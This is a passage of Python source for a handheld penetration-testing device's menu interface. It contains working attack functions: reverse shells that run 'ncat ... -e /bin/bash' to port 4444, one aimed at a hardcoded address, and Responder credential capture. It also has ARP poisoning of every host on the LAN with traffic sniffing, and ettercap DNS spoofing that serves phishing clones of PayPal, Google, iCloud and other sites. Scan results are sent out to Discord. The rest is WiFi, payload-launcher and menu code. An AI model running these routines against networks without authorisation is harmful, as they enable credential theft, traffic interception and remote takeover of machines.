    if interface == "__back__":
        return
    ip_with_mask = get_nmap_target_network(interface)

    if not ip_with_mask:
        Dialog_info("Network Error\nNo interface available", wait=True)
        return

    # If not /24, offer quick mask choices
    try:
        detected_net = ipaddress.ip_network(ip_with_mask, strict=False)
        if detected_net.prefixlen != 24:
            interface_ip = get_interface_ip(interface)
            choices = [
                f" Use detected {detected_net.with_prefixlen}",
                " Force /24",
                " Force /16",
                " Force /8",
            ]
            idx, _ = GetMenuString(choices, duplicates=True)
            if idx == -1:
                return
            if idx == 0:
                ip_with_mask = detected_net.with_prefixlen
            else:
                if interface_ip:
                    forced_mask = {1: 24, 2: 16, 3: 8}[idx]
                    forced_net = ipaddress.ip_network(f"{interface_ip}/{forced_mask}", strict=False)
                    ip_with_mask = forced_net.with_prefixlen
    except Exception:
        pass

    ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs(os.path.join(default.install_path, "loot/Nmap"), exist_ok=True)
    path = os.path.join(default.install_path, f"loot/Nmap/{label.lower().replace(' ', '_')}_{ts}.txt")
    xml_path = path.replace(".txt", ".xml")

    # Build nmap command with interface specification
    cmd = ["nmap"] + nmap_args + ["-oN", path, "-oX", xml_path]

    # Add interface-specific parameters for better results
    Dialog_info(f"      {label}\n        Running\n      wait please...", wait=True)

    interface_ip = get_interface_ip(interface)
    if interface_ip:
        cmd.extend(["-S", interface_ip, "-e", interface, "-Pn"])

    cmd.append(ip_with_mask)

    subprocess.run(cmd)
    subprocess.run(["sed", "-i", "s/Nmap scan report for //g", path])

    # Send scan results to Discord (non-blocking)
    def send_results_to_discord():
        try:
            if os.path.exists(path):
                # Send the file directly instead of reading content
                send_to_discord(label, path, ip_with_mask, interface)
        except Exception as e:
            print(f"Error sending scan results to Discord: {e}")

    # Send to Discord in background thread
    threading.Thread(target=send_results_to_discord, daemon=True).start()

    Dialog_info(f"      {label}\n      Finished !!!\n   Interface: {interface}", wait=True)
    time.sleep(2)


# ---------- main table Nmap arguments -----------------
SCANS = {
    "Quick Scan"            : ["-T5"],
    "Full Port Scan"        : ["-p-"],
    "Service Scan"          : ["-T5", "-sV"],
    "Vulnerability"         : ["-T5", "-sV", "--script", "vuln"],
    "Full Vulns"            : ["-p-", "-sV", "--script", "vuln"],
    "OS Scan"               : ["-T5", "-A"],
    "Intensive Scan"        : ["-O", "-p-", "--script", "vuln"],
    "Stealth SYN Scan"      : ["-sS", "-T4"],                        # Half-open scan, avoids full TCP handshake
    "UDP Scan"              : ["-sU", "-T4"],                        # Finds services that only speak UDP
    "Ping Sweep"            : ["-sn"],                               # Host discovery without port scanning
    "Top100 Scan"           : ["--top-ports", "100", "-T4"],         # Quick look at the most common ports
    "HTTP Enumeration"      : ["-p", "80,81,443,8080,8443", "-sV", "--script", "http-enum,http-title"],  # Fast web-focused recon
}


globals().update({
    f"scan_{k.lower().replace(' ', '_')}": partial(run_scan, k, v)
    for k, v in SCANS.items()
})



def defaut_Reverse():
    # Get best available interface and its IP
    interface = _choose_interface_for_action(get_best_interface_prefer_eth())
    if interface == "__back__":
        return

    try:
        default_ip_bytes = subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'|cut -d'.' -f1-3", shell=True)
        default_ip = default_ip_bytes.decode('utf-8').strip()
        default_ip_parts = default_ip.split(".")
        default_ip_prefix = ".".join(default_ip_parts[:3])
        new_value = GetIpValue(default_ip_prefix)
        target_ip = f"{default_ip_prefix}.{new_value}"
        nc_command = ['ncat', target_ip, '4444', '-e', '/bin/bash']
        print(f"Reverse launched on {target_ip} via {interface}!!!!!")
        process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
        Dialog_info(f"   Reverse launched !\n   on {target_ip}\n   via {interface}", wait=True)
        time.sleep(2)
    except Exception as e:
        Dialog_info(f"Reverse Error\nInterface: {interface}\nNo network?", wait=True)
        time.sleep(2)

def remote_Reverse():
    nc_command = ['ncat','192.168.1.30','4444', '-e', '/bin/bash']
    process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
    reverse_status = "(!!Remote launched!!)"
    draw.text((30, 0), reverse_status, fill="WHITE", font=font)

def responder_on():
    if is_responder_running():
        Dialog_info(" Already running !!!!", wait=True)
        time.sleep(2)
    else:
        # Get best interface for Responder
        interface = _choose_interface_for_action(get_responder_interface())
        if interface == "__back__":
            return
        os.system(f'python3 {os.path.join(default.install_path, "Responder/Responder.py")} -Q -I {interface} &')
        Dialog_info(f"     Responder \n      started !!\n   Interface: {interface}", wait=True)
        time.sleep(2)

def responder_off():
    os.system("killResponder=$(ps aux | grep Responder|grep -v 'grep'|awk '{print $2}')&&kill -9 $killResponder")
    Dialog_info("   Responder \n     stopped !!", wait=True)
    time.sleep(2)


def _get_gateway_for_interface(interface):
    try:
        gateways = netifaces.gateways()
        default_gw = gateways.get("default", {}).get(netifaces.AF_INET)
        if default_gw and default_gw[1] == interface:
            return default_gw[0]
        for gw, iface, _ in gateways.get(netifaces.AF_INET, []):
            if iface == interface:
                return gw
    except Exception:
        pass
    return None

def get_default_gateway_ip(interface=None):
    if interface:
        gw = _get_gateway_for_interface(interface)
        if gw:
            return gw
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]

def get_local_network(interface=None):
    if interface:
        ip, mask = _get_interface_ipv4(interface)
        if ip and mask:
            try:
                net = ipaddress.ip_network(f"{ip}/{mask}", strict=False)
                return net.with_prefixlen
            except Exception:
                pass
    default_gateway_ip = get_default_gateway_ip(interface)
    if default_gateway_ip:
        ip_parts = default_gateway_ip.split('.')
        ip_parts[-1] = '0'
        return '.'.join(ip_parts) + '/24'
    if interface:
        ip, _ = _get_interface_ipv4(interface)
        if ip:
            ip_parts = ip.split('.')
            ip_parts[-1] = '0'
            return '.'.join(ip_parts) + '/24'
    return None

def Start_MITM():
    safe_kill("arpspoof", "tcpdump")
    Dialog_info("                    Lancement\n                  MITM & Sniff\n                   En cours\n                  Patientez...", wait=True)

    # Get best interface for MITM attack
    interface = _choose_interface_for_action(get_mitm_interface())
    if interface == "__back__":
        return
    Dialog_info(f"Interface: {interface}", wait=False)
    local_network = get_local_network(interface)
    if not local_network:
        Dialog_info("MITM Error\nNo network\nfor interface", wait=True)
        return
    # Offer /24 or /16 if prefix is larger than /24
    try:
        net = ipaddress.ip_network(local_network, strict=False)
        if net.prefixlen < 24:
            ip, _mask = _get_interface_ipv4(interface)
            base24 = None
            base16 = None
            if ip:
                try:
                    base24 = str(ipaddress.ip_network(f"{ip}/24", strict=False).network_address)
                    base16 = str(ipaddress.ip_network(f"{ip}/16", strict=False).network_address)
                except Exception:
                    pass
            base24 = base24 or str(net.network_address)
            base16 = base16 or str(net.network_address)
            options = [("/24", base24), ("/16", base16)]
            idx = 0
            while True:
                lines = ["Select mask"]
                for i, (opt, base) in enumerate(options):
                    mark = ">" if i == idx else " "
                    lines.append(f"{mark}{base}{opt}")
                lines.append("KEY3=Back")
                draw_lock.acquire()
                try:
                    _draw_toolbar()
                    color.DrawMenuBackground()
                    for i, line in enumerate(lines[:7]):
                        draw.text(
                            (default.start_text[0],
                             default.start_text[1] + default.text_gap * i),
                            line[:m.max_len],
                            font=text_font,
                            fill=color.text
                        )
                finally:
                    draw_lock.release()
                time.sleep(0.12)
                btn = getButton()
                if btn == "KEY_UP_PIN":
                    idx = max(0, idx - 1)
                elif btn == "KEY_DOWN_PIN":
                    idx = min(len(options) - 1, idx + 1)
                elif btn in ("KEY3_PIN", "KEY_LEFT_PIN", "_KB_BACKSPACE"):
                    return
                elif btn == "KEY_PRESS_PIN":
                    chosen_opt, chosen_base = options[idx]
                    local_network = f"{chosen_base}{chosen_opt}"
                    break
    except Exception:
        pass
    Dialog_info(f"Network: {local_network}", wait=False)
    print(f"[*] Starting MITM attack on local network {local_network} via {interface}...")

# Scan hosts on the network
    print("[*] Scanning hosts on network...")
    cmd = f"arp-scan --localnet --interface {interface} --quiet|grep -v 'Interface\\|Starting\\|packets\\|Ending'"
    result = os.popen(cmd).readlines()

# Display IP and MAC addresses of hosts
    hosts = []
    for line in result:
        parts = line.split()
        if len(parts) == 2:
            hosts.append({'ip': parts[0], 'mac': parts[1]})
            print(f"[+] Host: {parts[0]} ({parts[1]})")

# Retrieve the gateway IP address
    gateway_ip = get_default_gateway_ip(interface)
    print(f"[*] Default gateway IP: {gateway_ip}")

# If at least one host is found, launch the ARP MITM attack
    if len(hosts) > 1:
        print(f"[*] Launching ARP poisoning attack via {interface}...")
        for host in hosts:
            if host['ip'] != gateway_ip:
                subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, host['ip']])
                subprocess.Popen(["arpspoof", "-i", interface, "-t", host['ip'], gateway_ip])
        print("[*] ARP poisoning attack complete.")

# Start tcpdump capture to sniff network traffic
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        os.makedirs(os.path.join(default.install_path, "loot/MITM"), exist_ok=True)
        pcap_file = os.path.join(default.install_path, f"loot/MITM/network_traffic_{now}.pcap")
        print(f"[*] Starting tcpdump capture and writing packets to {pcap_file}...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        tcpdump_process = subprocess.Popen(["tcpdump", "-i", interface, "-w", pcap_file], stdout=subprocess.PIPE)
        tcpdump_process.stdout.close()
        Dialog_info(f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!\n Interface: {interface}", wait=True)
        time.sleep(8)
    else:
        print("[-] No hosts found on network.")
        Dialog_info("  ERREUR\nAucun hote.. ", wait=True)
        time.sleep(2)

def Stop_MITM():
    safe_kill("arpspoof", "tcpdump")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    time.sleep(2)
    responder_status = "(!! MITM stopped !!)"
    draw.text((30, 0), responder_status, fill="WHITE", font=font)
    Dialog_info("    MITM & Sniff\n     stopped !!!", wait=True)
    time.sleep(2)


# Name of the currently spoofed site (used elsewhere in your code)
site_spoof = "wordpress"

def spoof_site(name: str):
    global site_spoof
    site_spoof = name

    Dialog_info(f"    Spoofing sur\n    {name} !!!", wait=True)
    time.sleep(2)

    subprocess.run("pkill -f 'php'", shell=True)   # stoppe les instances PHP
    time.sleep(1)

    webroot = os.path.join(default.install_path, f"DNSSpoof/sites/{name}")
    cmd = f"cd {webroot} && php -S 0.0.0.0:80"
    subprocess.Popen(cmd, shell=True)              # launch the built-in PHP

# Central list of sites to spoof: add/remove freely here
SITES = [
    "microsoft", "wordpress", "instagram", "google", "amazon", "apple",
    "twitter", "netflix", "spotify", "paypal", "linkedin", "snapchat",
    "pinterest", "yahoo", "steam", "adobe", "badoo", "icloud",
    "instafollowers", "ldlc", "origin", "playstation", "protonmail",
    "shopping", "wifi", "yandex",
]

site_spoof = "wordpress"
# Chemin du fichier etter.dns
ettercap_dns_file = "/etc/ettercap/etter.dns"


def Start_DNSSpoofing():
    # Get best interface for DNS spoofing
    interface = _choose_interface_for_action(get_best_interface_prefer_eth())
    if interface == "__back__":
        return

    # Get gateway and current IP automatically
    gateway_ip = get_default_gateway_ip(interface)
    current_ip = get_dns_spoof_ip(interface)

    if not current_ip:
        Dialog_info("DNS Spoof Error\nNo IP available", wait=True)
        return

# Escape special characters in the IP address for the sed command
    escaped_ip = current_ip.replace(".", r"\.")

    # Use sed to modify IP addresses in etter.dns file
    sed_command = f"sed -i 's/[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+/{escaped_ip}/g' {ettercap_dns_file}"
    subprocess.run(sed_command, shell=True)

    print("------------------------------- ")
    print(f"Site : {site_spoof}")
    print(f"Interface: {interface}")
    print(f"IP: {current_ip}")
    print("------------------------------- ")
    print("dns domain spoofed : ")
    dnsspoof_command = f"cat {ettercap_dns_file} | grep -v '#'"
    subprocess.run(dnsspoof_command, shell=True)
    print("------------------------------- ")

# Commands executed in the background
    website_command = f"cd {os.path.join(default.install_path, 'DNSSpoof/sites', site_spoof)} && php -S 0.0.0.0:80"
    ettercap_command = f"ettercap -Tq -M arp:remote -P dns_spoof -i {interface}"
    Dialog_info(f"    DNS Spoofing\n   {site_spoof}  started !!!\n Interface: {interface}", wait=True)
    time.sleep(2)

# Execution of background commands
    website_process = subprocess.Popen(website_command, shell=True)
    ettercap_process = subprocess.Popen(ettercap_command, shell=True)


def Stop_DNSSpoofing():
    # Terminer les processus website et ettercap
    subprocess.run("pkill -f 'php'", shell=True)
    subprocess.run("pkill -f 'ettercap'", shell=True)

    Dialog_info("    DNS Spoofing\n     stopped !!!", wait=True)
    time.sleep(2)

# WiFi Management Functions
def launch_wifi_manager():
    """Launch the FAST WiFi interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)
        return

    Dialog_info("Loading FAST WiFi\nSwitcher...", wait=True)
    exec_payload("utilities/fast_wifi_switcher.py")

def show_interface_info():
    """Show detailed interface information."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import show_interface_info as show_info

        # Create a text display of interface info
        current_interface = get_best_interface_prefer_eth()
        interface_ip = get_interface_ip(current_interface)

        info_lines = [
            f"Current: {current_interface}",
            f"IP: {interface_ip or 'None'}",
            "",
            "Press any key to exit"
        ]

        if current_interface.startswith('wlan'):
            try:
                from wifi.wifi_manager import wifi_manager
                status = wifi_manager.get_connection_status(current_interface)
                if status["ssid"]:
                    info_lines.insert(2, f"SSID: {status['ssid']}")
            except:
                pass

        GetMenuString(info_lines)

    except Exception as e:
        Dialog_info(f"Interface Info Error\n{str(e)[:20]}", wait=True)

def switch_interface_menu():
    """Show interface switching menu with actual switching capability."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import (
            list_wifi_interfaces_with_status,
            get_current_raspyjack_interface,
            set_raspyjack_interface
        )

        # Get current interface
        current = get_current_raspyjack_interface()

        # Get WiFi interfaces with status
        wifi_interfaces = list_wifi_interfaces_with_status()

        if not wifi_interfaces:
            Dialog_info("No WiFi interfaces\nfound!", wait=True)
            return

        # Create menu with interface status
        interface_list = []
        for iface_info in wifi_interfaces:
            name = iface_info['name']
            current_mark = ">" if iface_info['current'] else " "
            conn_status = "UP" if iface_info['connected'] else "DOWN"
            ip = iface_info['ip'][:10] if iface_info['ip'] else "No IP"
            interface_list.append(f"{current_mark} {name} ({conn_status}) {ip}")

        interface_list.append("")
        interface_list.append("Select WiFi interface")

        selection = GetMenuString(interface_list)

        if selection and not selection.startswith("Select") and selection.strip() and not selection.startswith(" "):
            # Extract interface name from selection
            parts = selection.split()
            if len(parts) >= 2:
                selected_iface = parts[1]  # Get the wlan0/wlan1 part

                if selected_iface.startswith('wlan'):
                    Dialog_info(f"Switching to\n{selected_iface}\nConfiguring routes...", wait=True)

                    # Actually perform the switch
                    success = set_raspyjack_interface(selected_iface)

                    if success:
                        Dialog_info(f"✓ SUCCESS!\nEmberJack now using\n{selected_iface}\nAll tools updated", wait=True)
                    else:
                        Dialog_info(f"✗ FAILED!\nCould not switch to\n{selected_iface}\nCheck connection", wait=True)

    except Exception as e:
        Dialog_info(f"Switch Error\n{str(e)[:20]}", wait=True)

def show_routing_status():
    """Show current routing status."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import get_current_default_route

        current_route = get_current_default_route()
        current_interface = get_best_interface_prefer_eth()

        if current_route:
            info_lines = [
                "Routing Status:",
                f"Default: {current_route.get('interface', 'unknown')}",
                f"Gateway: {current_route.get('gateway', 'unknown')}",
                f"EmberJack uses: {current_interface}",
                "",
                "Press any key to exit"
            ]
        else:
            info_lines = [
                "Routing Status:",
                "No default route found",
                f"EmberJack uses: {current_interface}",
                "",
                "Press any key to exit"
            ]

        GetMenuString(info_lines)

    except Exception as e:
        Dialog_info(f"Routing Error\n{str(e)[:20]}", wait=True)

def switch_to_wifi():
    """Switch system to use WiFi as primary interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import get_available_interfaces, ensure_interface_default

        # Find WiFi interfaces
        interfaces = get_available_interfaces()
        wifi_interfaces = [iface for iface in interfaces if iface.startswith('wlan')]

        if not wifi_interfaces:
            Dialog_info("No WiFi interfaces\nfound", wait=True)
            return

        # Use first available WiFi interface
        wifi_iface = wifi_interfaces[0]
        Dialog_info(f"Switching to WiFi\n{wifi_iface}\nPlease wait...", wait=True)

        success = ensure_interface_default(wifi_iface)

        if success:
            Dialog_info(f"✓ Switched to WiFi\n{wifi_iface}\nAll tools use WiFi", wait=True)
        else:
            Dialog_info(f"✗ Switch failed\nCheck WiFi connection", wait=True)

    except Exception as e:
        Dialog_info(f"WiFi Switch Error\n{str(e)[:20]}", wait=True)

def switch_to_ethernet():
    """Switch system to use Ethernet as primary interface."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import ensure_interface_default

        Dialog_info("Switching to Ethernet\neth0\nPlease wait...", wait=True)

        success = ensure_interface_default("eth0")

        if success:
            Dialog_info("✓ Switched to Ethernet\neth0\nAll tools use ethernet", wait=True)
        else:
            Dialog_info("✗ Switch failed\nCheck ethernet connection", wait=True)

    except Exception as e:
        Dialog_info(f"Ethernet Switch Error\n{str(e)[:20]}", wait=True)

def launch_interface_switcher():
    """Launch the interface switcher payload."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    Dialog_info("Loading Interface\nSwitcher...", wait=True)
    exec_payload("interface_switcher_payload.py")

def launch_webui():
    """Launch the WebUI controller payload (start/stop Web UI)."""
    Dialog_info("Loading WebUI...", wait=True)
    exec_payload("utilities/webui.py")

def quick_wifi_toggle():
    """FAST toggle between wlan0 and wlan1 - immediate switching."""
    if not WIFI_AVAILABLE:
        Dialog_info("WiFi system not found", wait=True)
        return

    try:
        from wifi.raspyjack_integration import (
            get_current_raspyjack_interface,
            set_raspyjack_interface
        )

        current = get_current_raspyjack_interface()

        # Determine target interface immediately
        if current == 'wlan0':
            target = 'wlan1'
        elif current == 'wlan1':
            target = 'wlan0'
        else:
            # Default to wlan1 if not using either
            target = 'wlan1'

        Dialog_info(f"FAST SWITCH:\n{current} -> {target}\nSwitching now...", wait=True)

        # IMMEDIATE switch with force
        success = set_raspyjack_interface(target)

        if success:
            Dialog_info(f"✓ SWITCHED!\n{target} active\n\nAll tools now\nuse {target}", wait=True)
        else:
            Dialog_info(f"✗ FAILED!\n{target} not ready\nCheck connection", wait=True)

    except Exception as e:
        Dialog_info(f"Error: {str(e)[:20]}", wait=True)


def list_payloads():
    """
    Returns the list of .py scripts under payload_path, as relative paths.
    """
    payloads = []
    try:
        for root, dirs, files in os.walk(default.payload_path):
            # Skip cache/hidden folders
            dirs[:] = [d for d in dirs if not d.startswith(".") and d != "__pycache__"]
            rel_dir = os.path.relpath(root, default.payload_path)
            for f in files:
                if not f.endswith(".py") or f.startswith("_"):
                    continue
                rel_path = os.path.join(rel_dir, f) if rel_dir != "." else f
                payloads.append(rel_path)
    except FileNotFoundError:
        os.makedirs(default.payload_path, exist_ok=True)
        return []

    return sorted(payloads, key=str.lower)

def list_payloads_by_category():
    """
    Return payloads grouped by category folder.
    - Files in payload_path root go to "general".
    - Subdirectory files show with subdir prefix.
    """
    categories: dict[str, list[str]] = {}
    for rel_path in list_payloads():
        parts = rel_path.split(os.sep)
        if len(parts) == 3:
            category = parts[0]
            display_name = f"{parts[1]}/{parts[2].replace('.py', '')}"
            rel_path = f"{category}/{display_name}"
        elif len(parts) > 1:
            category = parts[0]
        else:
            category = "general"
        categories.setdefault(category, []).append(rel_path)
    return categories

# ---------------------------------------------------------------------------
# Payload state (for WebUI status)
# ---------------------------------------------------------------------------
PAYLOAD_STATE_PATH = "/dev/shm/rj_payload_state.json"

def _write_payload_state(running: bool, path: str | None = None) -> None:
    try:
        state = {
            "running": bool(running),
            "path": path if running else None,
            "ts": time.time(),
        }
        with open(PAYLOAD_STATE_PATH, "w", encoding="utf-8") as f:
            json.dump(state, f)
    except Exception:
        pass

# ---------------------------------------------------------------------------
# 1)  Helper – reset GPIO *and* re-initialise the LCD
# ---------------------------------------------------------------------------
def _setup_gpio() -> None:
    """
    Bring every pin back to a known state **after** a payload
    (which most likely called ``GPIO.cleanup()`` on exit) and create a *fresh*
    LCD driver instance so that the display can be used again.
    """
    # --- GPIO -------------------------------------------------------------
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():                     # all buttons back to inputs
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    # --- LCD --------------------------------------------------------------
    global LCD, image, draw                      # replace the old objects
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (LCD.width, LCD.height), "BLACK")
    draw  = ImageDraw.Draw(image)


def _extract_payload_error_tail(log_path: str, start_pos: int = 0, max_lines: int = 3) -> str:
    """Read newly written payload error lines from *log_path* starting at *start_pos*."""
    try:
        with open(log_path, "rb") as fh:
            if start_pos > 0:
                fh.seek(start_pos)
            chunk = fh.read(32768)
    except OSError:
        return ""
    text = chunk.decode("utf-8", errors="replace")
    lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
    if not lines:
        return ""
    # Prefer the final exception line (e.g. "ModuleNotFoundError: No module named 'RPi'")
    # plus up to max_lines-1 preceding context lines, skipping noisy caret/traceback headers.
    filtered = [
        ln for ln in lines
        if ln != "Traceback (most recent call last):" and not set(ln) <= {"^", "~", " "}
    ]
    picked = (filtered or lines)[-max(1, int(max_lines)):]
    return "\n".join(picked)


# ---------------------------------------------------------------------------
# 2)  exec_payload – run a script then *immediately* restore RaspyJack UI
# ---------------------------------------------------------------------------
def exec_payload(filename: str, *args) -> None:
    """
    Execute a Python script located in « payloads/ » and *always*
    return control – screen **and** buttons – to RaspyJack.

    Workflow
    --------
    1. Freeze the UI (stop background threads, black screen).
    2. Run the payload **blocking** in the foreground.
    3. Whatever happens, re-initialise GPIO + LCD, show any real crash reason
       visibly on screen, and redraw the menu.
    """
    # Support passing (filename, arg1, arg2) as tuple for dynamic menus
    if isinstance(filename, (list, tuple)):
        if len(filename) >= 2:
            args = filename[1:] + args
            filename = filename[0]
        else:
            filename = filename[0]

    full = os.path.join(default.payload_path, filename)
    # Ensure .py extension
    if not full.endswith(".py"):
        full += ".py"
    if not os.path.isfile(full):
        print(f"[PAYLOAD] ✗ File not found: {full}")
        return                                       # nothing to launch

    print(f"[PAYLOAD] ► Starting: {filename}")
    _write_payload_state(True, filename)
    screen_lock.set()                # stop _stats_loop & _display_loop
    LCD.LCD_Clear()                  # give the payload a clean canvas

    import tempfile
    active_log_path = default.payload_log
    log = None
    log_start_pos = 0
    for cand_log in (default.payload_log, os.path.join(tempfile.gettempdir(), "rj_payload.log")):
        try:
            parent_dir = os.path.dirname(cand_log)
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)
            log = open(cand_log, "ab", buffering=0)
            active_log_path = cand_log
            try:
                log_start_pos = log.tell()
            except Exception:
                log_start_pos = 0
            break
        except OSError:
            log = None

    payload_error_title = ""
    payload_error_detail = ""
    try:
        # Ensure payloads can import RaspyJack modules reliably
        env = os.environ.copy()
        env["PYTHONPATH"] = default.install_path.rstrip(os.sep) + os.pathsep + env.get("PYTHONPATH", "")
        env["RJ_BASE_DIR"] = default.install_path.rstrip(os.sep)
        env["RJ_DISPLAY_TYPE"] = getattr(LCD_1in44, "_DISPLAY_TYPE", "ST7735_128")
        cmd = [sys.executable, full]
        if args:
            cmd.extend(args)
        result = subprocess.run(
            cmd,
            cwd=default.install_path,  # same PYTHONPATH as RaspyJack
            env=env,
            stdout=log if log is not None else subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        if log is not None:
            try:
                log.flush()
            except Exception:
                pass
        if result.returncode == 0:
            print("[PAYLOAD]   • Finished without error.")
        else:
            print(f"[PAYLOAD]   • ERROR: exit code {result.returncode}")
            tail = ""
            if log is not None:
                tail = _extract_payload_error_tail(active_log_path, log_start_pos, max_lines=2)
            elif getattr(result, "stdout", None):
                out_lines = [ln.strip() for ln in result.stdout.decode("utf-8", errors="replace").splitlines() if ln.strip()]
                tail = "\n".join(out_lines[-2:])
            payload_error_title = f"Payload Error (rc {result.returncode})"
            log_label = os.path.basename(active_log_path) if log is not None else "stderr"
            payload_error_detail = f"{tail}\n(Log: {log_label})" if tail else f"Exited with code {result.returncode}\nCheck {log_label}"
    except Exception as exc:
        print(f"[PAYLOAD]   • ERROR: {exc!r}")
        payload_error_title = "Payload Launch Error"
        payload_error_detail = f"{exc}\nCheck {os.path.basename(active_log_path)}"
    finally:
        if log is not None:
            try:
                log.close()
            except Exception:
                pass

    # ---- restore RaspyJack ----------------------------------------------
    print("[PAYLOAD] ◄ Restoring LCD & GPIO…")
    _write_payload_state(False, None)
    try:
        rj_keyboard.set_text_mode(False)
    except Exception:
        pass
    _setup_gpio()                                  # SPI/DC/RST/CS back
    try:
        rj_input.restart_listener()                # ensure virtual input socket is back
        rj_input.flush()
    except AttributeError:
        pass

    # Force a clean full-screen redraw to avoid leftover artifacts/border loss
    try:
        LCD.LCD_Clear()
    except Exception:
        pass
    try:
        draw_lock.acquire()
        draw.rectangle((0, 0, LCD.width, LCD.height), fill=color.background)
        color.DrawBorder()
    finally:
        draw_lock.release()

    # If the payload crashed, show the real error on screen now that LCD & input are restored!
    if payload_error_detail:
        t0 = time.time()
        while any(GPIO.input(p) == 0 for p in PINS.values()) and time.time() - t0 < .3:
            time.sleep(.03)
        try:
            rj_input.flush()
        except Exception:
            pass
        Dialog_result(payload_error_title or "Payload Error", payload_error_detail, wait=True)

    # refresh favorites in main menu (user may have changed them)
    m._inject_favorites()

    # rebuild the current menu image (respect current view mode)
    RenderCurrentMenuOnce()
    _mark_user_activity()

    # small debounce: 300 ms max
    t0 = time.time()
    while any(GPIO.input(p) == 0 for p in PINS.values()) and time.time() - t0 < .3:
        time.sleep(.03)

    screen_lock.clear()                            # threads can run again
    print("[PAYLOAD] ✔ Menu ready – you can navigate again.")


def OpenTerminal() -> None:
    """Launch the built-in persistent Obsidian Ember PTY terminal."""
    print("[TERM] ► Opening integrated terminal")
    screen_lock.set()
    try:
        rj_terminal.run_terminal_ui(
            LCD,
            pins=PINS,
            gpio=GPIO,
            persistent=True,
            cwd=default.install_path,
        )
    except Exception as exc:
        print(f"[TERM] ✗ Terminal error: {exc!r}")
    finally:
        try:
            rj_keyboard.set_text_mode(False)
        except Exception:
            pass
        try:
            rj_input.flush()
        except Exception:
            pass
        try:
            draw_lock.acquire()
            draw.rectangle((0, 0, LCD.width, LCD.height), fill=color.background)
            color.DrawBorder()
        finally:
            draw_lock.release()
        RenderCurrentMenuOnce()
        _mark_user_activity()
        screen_lock.clear()
        print("[TERM] ◄ Returned to menu")


### Menu class ###
class DisposableMenu:
    which  = "a"     # Start menu
    select = 0       # Current selection index
    _select_stack = []  # stack to remember parent selection when entering submenus
    char   = "> "    # Indentation character
    max_len = 17     # Max chars per line
    view_mode = "list"  # "list", "grid", or "carousel" - current view mode

    menu = {
        "a": (
            [" Terminal",       OpenTerminal],
            [" Apps",           partial(exec_payload, "utilities/app_launcher")],
            [" Payload", "ap"],            # p
            [" Guide",          partial(exec_payload, "utilities/guide")],
            [" Scan Nmap",      "ab"],     # b
            [" Reverse Shell",  "ac"],     # c
            [" Responder",      "ad"],     # d
            [" MITM & Sniff",   "ai"],     # i
            [" DNS Spoofing",   "aj"],     # j
            [" Network info",   ShowInfo], # appel direct
            [" WiFi Manager",   "aw"],     # w
            [" Bluetooth",      partial(exec_payload, "utilities/bluetooth_manager")],
            [" Audio",          partial(exec_payload, "utilities/audio_manager")],
            [" Other features", "ag"],     # g
            [" Read file",      "ah"],     # h
            [" Lock",           OpenLockMenu],
        ),

        "ab": tuple(
            [f" {name}", partial(run_scan, name, args)]
            for name, args in SCANS.items()
        ),

        "ac": (
            [" Defaut Reverse",  defaut_Reverse],
            [" Remote Reverse",  remote_Reverse]
        ),

        "ad": (
            [" Responder ON",   responder_on],
            [" Responder OFF",  responder_off]
        ),
        "ag": (
            [" Browse Images", ImageExplorer],
            [" Discord status", ShowDiscordInfo],
            [" Options",       "ae"],   # e
            [" System",        "af"]    # f
        ),

        "ae": (
            [" Colors",         "aea"],
            [" Flip screen 180", ToggleFlip],
            [" Clock settings", "aeb"],
            [" Refresh config", LoadConfig],
            [" Save config!",   SaveConfig]
        ),

        "aeb": (
            [" Show/Hide clock", ToggleClock],
            [" Set timezone",    ClockSetTimezone],
            [" Toggle NTP sync", ClockToggleNTP],
            [" Clock info",      ClockShowInfo],
        ),

        "aea": (
            [" Theme Presets",       "aeap"],
            [" Background",          [SetColor, 0]],
            [" Text",                [SetColor, 2]],
            [" Selected text",       [SetColor, 3]],
            [" Selected background", [SetColor, 4]],
            [" Border",              [SetColor, 1]],
            [" Gamepad border",      [SetColor, 5]],
            [" Gamepad fill",        [SetColor, 6]]
        ),

        "aeap": (
            [" Obsidian Ember", [ApplyThemePreset, "Obsidian Ember"]],
            [" Deep Amber",     [ApplyThemePreset, "Deep Amber"]],
            [" Carbon Copper",  [ApplyThemePreset, "Carbon Copper"]],
            [" Classic Green",  [ApplyThemePreset, "Classic Green"]],
        ),

        "af": (
            [" Shutdown system", [Leave, True]],
            [" Restart UI",      Restart]
        ),

        "ah": (
            [" Nmap",      ReadTextFileNmap],
            [" Responder logs", ReadTextFileResponder],
            [" Wardriving", ReadTextFileWardriving],
            [" DNSSpoof",  ReadTextFileDNSSpoof]
        ),

        "ai": (
